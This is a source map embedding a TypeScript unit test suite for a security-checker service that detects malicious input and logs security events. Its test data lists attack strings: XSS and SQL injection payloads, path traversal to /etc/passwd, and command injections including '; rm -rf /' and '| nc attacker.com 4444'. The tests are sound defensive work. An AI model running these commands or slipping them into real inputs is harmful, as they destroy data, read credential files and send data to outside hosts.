{"version":3,"sources":["../../../../../src/test/Validation/services/security-checker.service.spec.ts"],"sourcesContent":["import type { MockedObject } from 'vitest'\r\nimport { ConfigService } from '@microservice/Config/config.service'\r\nimport { SecurityCheckerService } from '@microservice/Validation/services/security-checker.service'\r\nimport { Test, TestingModule } from '@nestjs/testing'\nimport { beforeEach, describe, expect, it, vi } from 'vitest'\n\r\ndescribe('securityCheckerService', () => {\r\n\tlet service: SecurityCheckerService\r\n\tlet configService: MockedObject<ConfigService>\r\n\r\n\tbeforeEach(async () => {\r\n\t\tconst mockConfigService = {\r\n\t\t\tgetOptional: vi.fn(),\r\n\t\t}\r\n\r\n\t\tconst module: TestingModule = await Test.createTestingModule({\r\n\t\t\tproviders: [\r\n\t\t\t\tSecurityCheckerService,\r\n\t\t\t\t{ provide: ConfigService, useValue: mockConfigService },\r\n\t\t\t],\r\n\t\t}).compile()\r\n\r\n\t\tservice = module.get<SecurityCheckerService>(SecurityCheckerService)\r\n\t\tconfigService = module.get(ConfigService)\r\n\r\n\t\t// Setup default config responses\r\n\t\tconfigService.getOptional.mockImplementation((key, defaultValue) => {\r\n\t\t\tconst configs: Record<string, any> = {\r\n\t\t\t\t'validation.maxStringLength': 10000,\r\n\t\t\t}\r\n\t\t\treturn configs[key] || defaultValue\r\n\t\t})\r\n\t})\r\n\r\n\tit('should be defined', () => {\r\n\t\texpect(service).toBeDefined()\r\n\t})\r\n\r\n\tdescribe('checkForMaliciousContent', () => {\r\n\t\tit('should detect script injection attempts', async () => {\r\n\t\t\tconst maliciousInputs = [\r\n\t\t\t\t'<script>alert(\"xss\")</script>',\r\n\t\t\t\t'javascript:alert(1)',\r\n\t\t\t\t'vbscript:msgbox(\"evil\")',\r\n\t\t\t\t'data:text/html,<script>alert(1)</script>',\r\n\t\t\t\t'onclick=\"alert(1)\"',\r\n\t\t\t]\r\n\r\n\t\t\tfor (const input of maliciousInputs) {\r\n\t\t\t\tconst result = await service.checkForMaliciousContent(input)\r\n\t\t\t\texpect(result).toBe(true)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should detect SQL injection attempts', async () => {\r\n\t\t\tconst maliciousInputs = [\r\n\t\t\t\t'\\'; DROP TABLE users; --',\r\n\t\t\t\t'UNION SELECT * FROM passwords',\r\n\t\t\t\t'INSERT INTO admin VALUES',\r\n\t\t\t\t'DELETE FROM users WHERE',\r\n\t\t\t]\r\n\r\n\t\t\tfor (const input of maliciousInputs) {\r\n\t\t\t\tconst result = await service.checkForMaliciousContent(input)\r\n\t\t\t\texpect(result).toBe(true)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should detect path traversal attempts', async () => {\r\n\t\t\tconst maliciousInputs = [\r\n\t\t\t\t'../../../etc/passwd',\r\n\t\t\t\t'..\\\\..\\\\windows\\\\system32',\r\n\t\t\t\t'%2e%2e%2f%2e%2e%2f',\r\n\t\t\t\t'%2e%2e%5c%2e%2e%5c',\r\n\t\t\t]\r\n\r\n\t\t\tfor (const input of maliciousInputs) {\r\n\t\t\t\tconst result = await service.checkForMaliciousContent(input)\r\n\t\t\t\texpect(result).toBe(true)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should detect command injection attempts', async () => {\r\n\t\t\tconst maliciousInputs = [\r\n\t\t\t\t'; rm -rf /',\r\n\t\t\t\t'; cat /etc/passwd',\r\n\t\t\t\t'| nc attacker.com 4444',\r\n\t\t\t\t'; ls -la',\r\n\t\t\t]\r\n\r\n\t\t\tfor (const input of maliciousInputs) {\r\n\t\t\t\tconst result = await service.checkForMaliciousContent(input)\r\n\t\t\t\texpect(result).toBe(true)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should allow safe content', async () => {\r\n\t\t\tconst safeInputs = [\r\n\t\t\t\t'Hello World',\r\n\t\t\t\t'user@example.com',\r\n\t\t\t\t'https://example.com/image.jpg',\r\n\t\t\t\t'Normal text with numbers 123',\r\n\t\t\t\t{ name: 'John', age: 30 },\r\n\t\t\t]\r\n\r\n\t\t\tfor (const input of safeInputs) {\r\n\t\t\t\tconst result = await service.checkForMaliciousContent(input)\r\n\t\t\t\texpect(result).toBe(false)\r\n\t\t\t}\r\n\t\t})\r\n\r\n\t\tit('should detect excessively long strings', async () => {\r\n\t\t\tconst longString = 'a'.repeat(15000)\r\n\t\t\tconst result = await service.checkForMaliciousContent(longString)\r\n\t\t\texpect(result).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should detect high entropy strings (potential encoded payloads)', async () => {\r\n\t\t\t// Base64 encoded string with high entropy\r\n\t\t\tconst highEntropyString = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IHN0cmluZyB3aXRoIGhpZ2ggZW50cm9weQ=='\r\n\t\t\tconst result = await service.checkForMaliciousContent(highEntropyString)\r\n\t\t\texpect(result).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should handle objects and detect prototype pollution', async () => {\r\n\t\t\tconst maliciousObject = {\r\n\t\t\t\t__proto__: { admin: true },\r\n\t\t\t\tconstructor: { prototype: { admin: true } },\r\n\t\t\t\tprototype: { admin: true },\r\n\t\t\t}\r\n\r\n\t\t\tconst result = await service.checkForMaliciousContent(maliciousObject)\r\n\t\t\texpect(result).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should detect excessively deep objects', async () => {\r\n\t\t\tconst deepObject: any = {}\r\n\t\t\tlet current = deepObject\r\n\r\n\t\t\t// Create object with depth > 10\r\n\t\t\tfor (let i = 0; i < 15; i++) {\r\n\t\t\t\tcurrent.nested = {}\r\n\t\t\t\tcurrent = current.nested\r\n\t\t\t}\r\n\r\n\t\t\tconst result = await service.checkForMaliciousContent(deepObject)\r\n\t\t\texpect(result).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should handle arrays recursively', async () => {\r\n\t\t\tconst maliciousArray = [\r\n\t\t\t\t'safe content',\r\n\t\t\t\t'<script>alert(\"xss\")</script>',\r\n\t\t\t\t'more safe content',\r\n\t\t\t]\r\n\r\n\t\t\tconst result = await service.checkForMaliciousContent(maliciousArray)\r\n\t\t\texpect(result).toBe(true)\r\n\t\t})\r\n\r\n\t\tit('should handle null and undefined safely', async () => {\r\n\t\t\texpect(await service.checkForMaliciousContent(null)).toBe(false)\r\n\t\t\texpect(await service.checkForMaliciousContent(undefined)).toBe(false)\r\n\t\t})\r\n\t})\r\n\r\n\tdescribe('logSecurityEvent', () => {\r\n\t\tit('should log security events', async () => {\r\n\t\t\tconst event = {\r\n\t\t\t\ttype: 'malicious_content' as const,\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: { input: 'test' },\r\n\t\t\t\ttimestamp: new Date(),\r\n\t\t\t\tclientIp: '127.0.0.1',\r\n\t\t\t\tuserAgent: 'test-agent',\r\n\t\t\t}\r\n\r\n\t\t\tawait service.logSecurityEvent(event)\r\n\r\n\t\t\tconst events = service.getSecurityEvents(1)\r\n\t\t\texpect(events).toHaveLength(1)\r\n\t\t\texpect(events[0]).toMatchObject(event)\r\n\t\t})\r\n\r\n\t\tit('should add timestamp if not provided', async () => {\r\n\t\t\tconst event = {\r\n\t\t\t\ttype: 'invalid_url' as const,\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: { url: 'test' },\r\n\t\t\t}\r\n\r\n\t\t\tawait service.logSecurityEvent(event)\r\n\r\n\t\t\tconst events = service.getSecurityEvents(1)\r\n\t\t\texpect(events[0].timestamp).toBeInstanceOf(Date)\r\n\t\t})\r\n\r\n\t\tit('should limit stored events to 1000', async () => {\r\n\t\t\t// Add more than 1000 events\r\n\t\t\tfor (let i = 0; i < 1100; i++) {\r\n\t\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\t\ttype: 'malicious_content',\r\n\t\t\t\t\tsource: 'test',\r\n\t\t\t\t\tdetails: { index: i },\r\n\t\t\t\t})\r\n\t\t\t}\r\n\r\n\t\t\tconst events = service.getSecurityEvents(2000)\r\n\t\t\texpect(events.length).toBeLessThanOrEqual(1000)\r\n\t\t})\r\n\t})\r\n\r\n\tdescribe('getSecurityStats', () => {\r\n\t\tit('should return security statistics', async () => {\r\n\t\t\t// Add some test events\r\n\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\ttype: 'malicious_content',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: {},\r\n\t\t\t})\r\n\r\n\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\ttype: 'invalid_url',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: {},\r\n\t\t\t})\r\n\r\n\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\ttype: 'malicious_content',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: {},\r\n\t\t\t})\r\n\r\n\t\t\tconst stats = service.getSecurityStats()\r\n\r\n\t\t\texpect(stats.totalEvents).toBe(3)\r\n\t\t\texpect(stats.eventsByType.malicious_content).toBe(2)\r\n\t\t\texpect(stats.eventsByType.invalid_url).toBe(1)\r\n\t\t\texpect(typeof stats.recentEvents).toBe('number')\r\n\t\t})\r\n\r\n\t\tit('should count recent events correctly', async () => {\r\n\t\t\tconst now = new Date()\r\n\t\t\tconst twoHoursAgo = new Date(now.getTime() - 2 * 60 * 60 * 1000)\r\n\r\n\t\t\t// Add old event\r\n\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\ttype: 'malicious_content',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: {},\r\n\t\t\t\ttimestamp: twoHoursAgo,\r\n\t\t\t})\r\n\r\n\t\t\t// Add recent event\r\n\t\t\tawait service.logSecurityEvent({\r\n\t\t\t\ttype: 'invalid_url',\r\n\t\t\t\tsource: 'test',\r\n\t\t\t\tdetails: {},\r\n\t\t\t\ttimestamp: now,\r\n\t\t\t})\r\n\r\n\t\t\tconst stats = service.getSecurityStats()\r\n\t\t\texpect(stats.recentEvents).toBe(1) // Only the recent event\r\n\t\t})\r\n\t})\r\n})\r\n"],"names":["ConfigService","SecurityCheckerService","Test","beforeEach","describe","expect","it","vi","service","configService","mockConfigService","getOptional","fn","module","createTestingModule","providers","provide","useValue","compile","get","mockImplementation","key","defaultValue","configs","toBeDefined","maliciousInputs","input","result","checkForMaliciousContent","toBe","safeInputs","name","age","longString","repeat","highEntropyString","maliciousObject","__proto__","admin","prototype","deepObject","current","i","nested","maliciousArray","undefined","event","type","source","details","timestamp","Date","clientIp","userAgent","logSecurityEvent","events","getSecurityEvents","toHaveLength","toMatchObject","url","toBeInstanceOf","index","length","toBeLessThanOrEqual","stats","getSecurityStats","totalEvents","eventsByType","malicious_content","invalid_url","recentEvents","now","twoHoursAgo","getTime"],"mappings":"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"}